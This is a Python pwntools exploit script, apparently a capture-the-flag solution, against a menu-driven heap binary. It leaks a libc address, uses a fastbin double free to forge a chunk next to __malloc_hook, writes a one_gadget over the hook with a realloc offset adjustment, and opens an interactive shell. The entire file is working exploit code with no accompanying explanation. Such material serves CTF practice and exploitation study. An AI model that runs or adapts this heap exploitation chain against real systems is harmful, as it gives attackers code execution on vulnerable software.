from pwn import *
context(arch='amd64', log_level='debug')
 
context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./vuln"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    #io = process(vuln_path)
    io = process([vuln_path])
else:
    io = remote("", 9999)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

def create(idx, size, data=""):
    io.sendlineafter(">", str(1))
    io.sendlineafter("Index: ", str(idx))
    io.sendlineafter("Size: ", str(size))
    io.sendlineafter("Content: ", data)
    
def show(idx):
    io.sendlineafter(">", str(3))
    io.sendlineafter("Index: ", str(idx))

def delete(idx):
    io.sendlineafter(">", str(2))
    io.sendlineafter("Index: ", str(idx))

create(0, 0x80, "tinyfat")
create(1, 0x60, "tinyfat")
create(2, 0x60, "tinyfat")
delete(0)
show(0)
main_arena = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
log.success("main_arena:------> " + hex(main_arena))
libc.address = main_arena - 0x3c4b78
log.success("libc address:----->" + hex(libc.address))
malloc_hook = libc.symbols["__malloc_hook"]
log.success("malloc hook:-----> " + hex(malloc_hook))
realloc = libc.symbols["realloc"]
log.success("realloc:-----> " + hex(realloc))

# 121 法则
delete(1)
delete(2)
delete(1)

create(3, 0x60, p64(malloc_hook-0x23))
create(4, 0x60, "tinyfat")
create(5, 0x60, "tinyfat")

one_gadget = libc.address + 0xf1247 
log.success("one_gadge: -----> "+hex(one_gadget))
create(7, 0x60, b"a"*11 + p64(one_gadget) + p64(realloc+11))

#ddebug("b malloc\n b free\ncontinue")
#ddebug(f"b *{one_gadget}\ncontinue")

io.sendlineafter(">", str(1))
io.sendlineafter("Index: ", str(8))
io.sendlineafter("Size: ", str(0x60))

io.interactive()
